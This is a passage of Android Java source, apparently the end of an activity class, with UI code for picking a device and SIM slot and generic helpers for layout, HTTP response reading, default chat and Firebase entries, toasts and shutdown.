        setBtn.setTypeface(null, android.graphics.Typeface.BOLD);
        setBtn.setBackgroundResource(R.drawable.btn_set);
        setBtn.setPadding(dp(12), dp(12), dp(12), dp(12));
        try { setBtn.setStateListAnimator(null); } catch (Exception ignore) {}
        LinearLayout.LayoutParams setLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        setLp.topMargin = dp(10);
        setBtn.setLayoutParams(setLp);
        setBtn.setOnClickListener(v -> {
            int checkedId = rg.getCheckedRadioButtonId();
            String simVal = "0";
            if (checkedId == rb1.getId()) simVal = "1";
            setDevice(d.id, d.model, simVal);
        });
        card.addView(setBtn);

        return card;
    }

    private View infoRow(String label, String value, String valueColor) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams rowLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rowLp.bottomMargin = dp(8);
        row.setLayoutParams(rowLp);

        TextView lbl = new TextView(this);
        lbl.setText(label);
        lbl.setTextColor(Color.parseColor("#777777"));
        lbl.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        lbl.setTypeface(null, android.graphics.Typeface.BOLD);
        lbl.setLayoutParams(new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        TextView val = new TextView(this);
        val.setText(value);
        val.setTextColor(Color.parseColor(valueColor));
        val.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        val.setTypeface(null, android.graphics.Typeface.BOLD);
        val.setGravity(Gravity.END);

        row.addView(lbl);
        row.addView(val);
        return row;
    }

    private void setDevice(String id, String model, String simVal) {
        selectedDeviceId = id;
        selectedSimIndex = simVal;
        addLog("[DEVICE] " + model + " (ID: " + id + ") set on SIM " +
                (Integer.parseInt(selectedSimIndex) + 1) + ".", "info");
        switchPage("homePage");
    }

    // ==========================================
    // HELPERS
    // ==========================================
    private ChatId defaultChat() {
        for (ChatId c : chatIds) if (c.isDefault) return c;
        return null;
    }

    private FirebaseUrl defaultFirebase() {
        for (FirebaseUrl f : firebaseUrls) if (f.isDefault) return f;
        return null;
    }

    private String readBody(HttpURLConnection c) throws Exception {
        InputStream is;
        try { is = c.getInputStream(); }
        catch (Exception e) { is = c.getErrorStream(); }
        if (is == null) return "";
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = is.read(buf)) != -1) bos.write(buf, 0, n);
        is.close();
        return bos.toString("UTF-8");
    }

    private int dp(int v) {
        return Math.round(v * getResources().getDisplayMetrics().density);
    }

    private void alert(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isRunning = false;
        mainHandler.removeCallbacksAndMessages(null);
        executor.shutdownNow();
    }
}
